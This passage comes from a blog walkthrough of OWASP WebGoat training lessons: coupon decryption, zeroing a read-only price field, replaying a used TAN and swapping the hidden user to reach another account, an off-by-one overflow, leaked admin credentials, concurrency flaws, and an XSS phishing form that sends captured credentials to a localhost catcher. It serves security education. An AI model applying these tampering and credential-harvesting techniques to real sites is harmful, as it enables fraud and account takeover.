</span><span class='line'><span class="k">return</span> <span class="kc">false</span><span class="p">;</span>   
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">code</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'><span class="nx">code</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nx">alpha</span> <span class="o">=</span> <span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'><span class="nx">caesar</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">length</span> <span class="p">;</span><span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">--</span><span class="p">){</span>  
</span><span class='line'>  
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">j</span><span class="o">&lt;</span><span class="nx">alpha</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">j</span><span class="o">++</span><span class="p">){</span>     
</span><span class='line'>          
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">==</span> <span class="nx">alpha</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">j</span><span class="p">)){</span>
</span><span class='line'>          
</span><span class='line'><span class="nx">caesar</span> <span class="o">=</span> <span class="nx">caesar</span> <span class="o">+</span> <span class="nx">alpha</span><span class="p">.</span><span class="nx">charAt</span><span class="p">((</span><span class="nx">j</span><span class="o">+</span><span class="p">(</span><span class="nx">alpha</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">%</span><span class="nx">alpha</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>      
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="p">}</span>  
</span><span class='line'><span class="k">return</span> <span class="nx">caesar</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The coupons are encrypted with a Caesar cipher, but we don&rsquo;t have to manually reverse it. I called the <em>decrypt</em> function on one of the coupon values to receive the decrypted result:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>alert(decrypt("nvojubmq")); </span></code></pre></td></tr></table></div></figure>


<p>That gave the result PLATINUM.</p>

<p><strong>STAGE 2:</strong> Now, try to get your entire order for free.</p>

<p>Hint: Use Firebug to remove the &ldquo;readonly&rdquo; attribute from the input next to &ldquo;The total charged to your credit card:&rdquo; and set the value to 0.</p>

<p>Just follow the hit, select the element with Firebug, delete the readonly attribute, and set the price to 0. Then purchase stuff for free!</p>

<h3>Authentication Flaws</h3>

<p><strong>Password Strength</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Accounts are only as secure as their passwords. Most users have the same weak password everywhere. If you want to protect them against brute-force-attacks, your application should have good requirements for passwords. The password should contain lower case letters, capitals and numbers. The longer the password, the better.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/pass_stre.png" title="password strength" alt="password strength"></p>

<p>The site required by the lesson was no longer available. I tried other similar sites, but none gave the values required to pass the lesson. so you can just copy them from the solution. I skipped it.</p>

<p><strong>Forgot Password</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/forgot_pass.png" title="forgot password" alt="forgot pass"></p>

<p>This was a matter of guessing. When giving a username, you are asked a secret question of what is your favorite color. I tried a couple of guesses for the admin user, until I stumbled upon the correct answer, which is green. Then you are presented with the user&rsquo;s password, and looking at the admin password, it would have taken lifetimes to crack it.</p>

<p><strong>Basic Authentication</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/basic_auth.png" title="basic authentication" alt="basic authentication"></p>

<p>Click submit and intercept the request. You will see the following header: <code>Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=</code>. Decode the Base 64 data for the credentials <em>guest:guest</em>. You will now see a new message:</p>

<p>&ldquo;Congratulations, you have figured out the mechanics of basic authentication.  &ndash; Now you must try to make WebGoat reauthenticate you as:     &ndash; username: basic     &ndash; password: basic. Use the Basic Authentication Menu to start at login page.&rdquo;</p>

<p>&ldquo;Use the hints! One at a time&hellip;&rdquo;</p>

<p>I trapped the request and looked for this: <code>header=Authorization&amp;value=guest%3Aguest&amp;SUBMIT=Submit</code>. But even when I modified it to basic, it didn&rsquo;t work. It turns out, you have to make the web application present you with a login popup like when you first start it. To do that, I deleted the JSESSIONID cookie. But this also wasn&rsquo;t enough. I got the message:</p>

<blockquote><p>You&rsquo;re really close! Changing the session cookie caused the server to create a new session for you. This did not cause the server to reauthenticate you. When you figure out how to force the server to perform
an authentication request, you have to authenticate as:</p>

<p>user name: basic
password: basic</p></blockquote>

<p>I had to also modify the Authorization header so that it wouldn&rsquo;t be valid anymore. But that also got me a &ldquo;you&rsquo;re close message&rdquo;:</p>

<blockquote><p>You&rsquo;re almost there! You&rsquo;ve modified the Authorization header but you are still logged in as guest. Look at the request after you typed in the &lsquo;basic&rsquo; user credentials and submitted the request. Remember the
order of events that occur during Basic Authentication.</p></blockquote>

<p>I had issues with completing this by invalidating the header and the cookie, and then entering the new credentials at popup. So I just restarted the application and logged in as <em>basic</em> from the beginning, after I cleared the saved passwords from the browser. Then the exercise was marked as finished.</p>

<p><strong>Multi Level Login 1</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
A Multi Level Login should provide a strong authentication. This is archived by adding a second layer. After having logged in with your user name and password you are asked for a &lsquo;Transaction Authentication Number&rsquo; (TAN). This is often used by online banking. You get a list with a lots of TANs generated only for you by the bank. Each TAN is used only once. Another method is to provide the TAN by SMS. This has the advantage that an attacker cannot get TANs provided for the user.</p>

<p>General Goal(s):
In this Lesson you try to get around the strong authentication. You have to break into another account. The user name, password and a already used TAN is provided. You have to make sure the server accepts the TAN even it is already used.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/mll.png" title="multi level login" alt="multi level login"></p>

<p>Log in and provide the first TAN. This is a demo stage.</p>

<p><strong>STAGE 2:</strong> Now you are a hacker who already has stolen some information from Jane by a phishing mail. You have the password which is tarzan and the Tan #1 which is 15648</p>

<p>The problem is that the first tan is already used&hellip; try to break into the system anyway.</p>

<p>When you provide the TAN, look inside the request for this: <code>hidden_tan=2&amp;tan=15648+&amp;Submit=Submit</code>. Change the hidden tan to 1 to correspond to the TAN that you have.</p>

<p><strong>Multi Level Login 2</strong></p>

<p><strong>General Goal(s):</strong>
In this lesson you have to try to break into another account. You have an own account for WebGoat Financial but you want to log into another account only knowing the user name of the victim to attack.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/mll2.png" title="multi level login 2" alt="multi level login 2"></p>

<p>This time in the intercepted request, change the hidden user from Joe to Jane.</p>

<h3>Buffer Overflows</h3>

<p><strong>Off-by-One Overflows</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Exploit a Web Based &ldquo;Off-by-One&rdquo; Buffer Overflow.</p>

<p><strong>How the attack works:</strong>
Despite being more rare, buffer overflow vulnerabilities on the web occur when a tier of the application has insufficient memory allocated to deal with the data submitted by the user. Typically, such a tier would be written in C or a similar language. For the particular subset, namely, off-by-one overflows, this lesson focuses on the consequences of being able to overwrite the position for the trailing null byte. As a result, further information is returned back to the user, due to the fact that no null byte was found.</p>

<p><strong>Lesson Goal(s):</strong></p>

<ul>
<li>Understand how a buffer overflow vulnerability can be triggered on a web application.</li>
<li>Understand what type of value lengths are likely to trigger a buffer overflow.</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/webgoat/offby1.png" title="off by 1 buffer overflow" alt="off by 1 BO"></p>

<p>I tried every field with a 5000 character string generated by <code>pattern_create.rb</code> until I noticed a change in the source. The exploitable field is the room number field. Once I chose the price plan, I saw this message: &ldquo;To complete the lesson, restart lesson and enter VIP first/last name&rdquo;. So I knew I was on the right track, and in the source, I could see new goodies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;a&#39;</span> <span class="na">type=</span><span class="s">&#39;HIDDEN&#39;</span> <span class="na">value=</span><span class="s">&#39;Hacker&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;b&#39;</span> <span class="na">type=</span><span class="s">&#39;HIDDEN&#39;</span> <span class="na">value=</span><span class="s">&#39;A&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;c&#39;</span> <span class="na">type=</span><span class="s">&#39;HIDDEN&#39;</span> <span class="na">value=</span><span class="s">&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;d&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Johnathan&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;e&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Ravern&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;f&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;4321&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;g&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;John&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;h&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Smith&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;i&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;56&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;j&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Ana&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;k&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Arneta&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;l&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;78&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;m&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Lewis&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;n&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;Hamilton&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&#39;o&#39;</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value=</span><span class="s">&#39;9901&#39;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pick one of these to submit and complete the lesson.</p>

<h3>Code Quality</h3>

<p><strong>Discover Clues in the HTML</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/html_comments.png" title="code quality" alt="code comments"></p>

<p>Find the HTML comments in the source: &ldquo;FIXME admin:adminpw&rdquo;, &ldquo;Use Admin to regenerate database&rdquo;</p>

<h3>Concurrency</h3>

<p><strong>Thread Safety Problems</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Web applications can handle many HTTP requests simultaneously. Developers often use variables that are not thread safe.  Thread safety means that the fields of an object or class always maintain a valid state when used concurrently by multiple threads. It is often possible to exploit a concurrency bug by loading the same page as another user at the exact same time. Because all threads share the same method area, and the method area is where all class variables are stored, multiple threads can attempt to use the same class variables concurrently.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/threads.png" title="thread safety" alt="thread safety"></p>

<p>Try submitting the 2 user names from different browsers in very quick succession, and both browsers will return same user information.</p>

<p><strong>Shopping Cart Concurrency Flaw</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/concurrency.png" title="concurrency flaw" alt="concurrency flaw"></p>

<p>This time, the exploitation will be done in 2 tabs, instead of 2 browsers. Get 2 tabs on the same page.</p>

<p>On Tab1, select a low price item and add it to cart. Go all the way to confirming the purchase.</p>

<p>On Tab2, add to cart an expensive item.</p>

<p>On Tab1, confirm the purchase and you will see this: &ldquo;Thank you for shopping! You have (illegally!) received a 90% discount. Police are on the way to your IP address.&rdquo;</p>

<h3>Cross-Site Scripting (XSS)</h3>

<p><strong>Phishing with XSS</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. With the help of XSS you can do a Phishing Attack and add content to a page which looks official. It is very hard for a victim to determinate that the content is malicious.</p>

<p><strong>General Goal(s):</strong>
The user should be able to add a form asking for username and password. On submit the input should be sent to <a href="http://localhost/WebGoat/catcher?PROPERTY=yes">http://localhost/WebGoat/catcher?PROPERTY=yes</a> &amp;user=catchedUserName&amp;password=catchedPasswordName</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/xss_phish.png" title="phishing xss" alt="phishing xss"></p>

<p>I made a fake form with a submit button that sends the credentials to the harverster when clicked. Here it is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form&gt;</span>
</span><span class='line'><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">&quot;stealer&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
</span><span class='line'>Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Submit&quot;</span> <span class="na">onclick=</span><span class="s">&lt;script</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;</span><span class="err">+</span> <span class="na">document</span><span class="err">.</span><span class="na">stealer</span><span class="err">.</span><span class="na">username</span><span class="err">.</span><span class="na">value</span> <span class="err">+</span> <span class="err">&quot;&amp;</span><span class="na">password=</span><span class="s">&quot; + document.stealer.password.value + &quot;</span><span class="err">&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>LAB: Cross Site Scripting</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
